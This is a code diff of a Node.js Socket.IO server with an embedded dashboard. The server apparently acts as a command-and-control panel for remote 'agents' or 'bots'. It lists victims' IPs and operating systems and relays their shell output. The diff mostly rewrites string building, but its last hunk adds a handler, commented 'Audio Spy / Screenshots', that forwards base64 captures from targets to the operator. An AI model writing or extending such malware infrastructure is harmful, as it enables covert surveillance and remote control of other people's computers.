@@ -9,6 +9,7 @@ const app = express();
 app.use(cors());
 
 // --- EMBEDDED DASHBOARD UI (SERVED ON /) ---
+// Note: Using concatenation for inner JS to avoid template literal nesting issues in Node.js
 const dashboardHTML = `
 <!DOCTYPE html>
 <html lang="en">
@@ -57,7 +58,8 @@ const dashboardHTML = `
 
         function addLog(msg) {
             const div = document.createElement('div');
-            div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            // Safe concatenation to avoid template literal nesting errors
+            div.innerText = "[" + new Date().toLocaleTimeString() + "] " + msg;
             logsDiv.prepend(div);
         }
 
@@ -77,22 +79,21 @@ const dashboardHTML = `
 
             agents.forEach(a => {
                 const isOnline = a.status === 'Online';
-                const html = `
-                    <div class="node ${isOnline ? 'online' : 'offline'}">
-                        <div style="font-weight:bold; margin-bottom:5px;">
-                            <span class="status-dot ${isOnline ? 'bg-green' : 'bg-red'}"></span>
-                            ${a.id}
-                        </div>
-                        <div style="font-size: 11px; color: #666; margin-bottom:2px;">IP: ${a.ip}</div>
-                        <div style="font-size: 11px; color: #666;">OS: ${a.os}</div>
-                    </div>
-                `;
+                // Using concatenation for HTML construction
+                let html = '<div class="node ' + (isOnline ? 'online' : 'offline') + '">';
+                html += '<div style="font-weight:bold; margin-bottom:5px;">';
+                html += '<span class="status-dot ' + (isOnline ? 'bg-green' : 'bg-red') + '"></span> ' + a.id;
+                html += '</div>';
+                html += '<div style="font-size: 11px; color: #666; margin-bottom:2px;">IP: ' + a.ip + '</div>';
+                html += '<div style="font-size: 11px; color: #666;">OS: ' + a.os + '</div>';
+                html += '</div>';
+                
                 botsDiv.innerHTML += html;
             });
         });
 
         socket.on('agent_event', (evt) => {
-            addLog(`EVENT [${evt.type}] from ${evt.agentId}: ${evt.payload}`);
+            addLog("EVENT [" + evt.type + "] from " + evt.agentId + ": " + evt.payload);
         });
     </script>
 </body>
@@ -148,6 +149,17 @@ io.on('connection', (socket) => {
     socket.on('stream_log', (data) => {
         // Relay to UIs
         io.emit('agent_event', { type: 'SHELL_OUTPUT', agentId: data.from, payload: data.output });
+    });
+    
+    // Handle File Uploads (Audio Spy / Screenshots)
+    socket.on('upload_file', (data) => {
+        // data = { target, filename, b64content }
+        // For now, just relay it as an event to the Dashboard
+        io.emit('agent_event', { 
+            type: 'SCREENSHOT', 
+            agentId: data.target || 'Unknown', 
+            payload: data.b64content 
+        });
     });
 
     // Handle Commands from UI to Agent
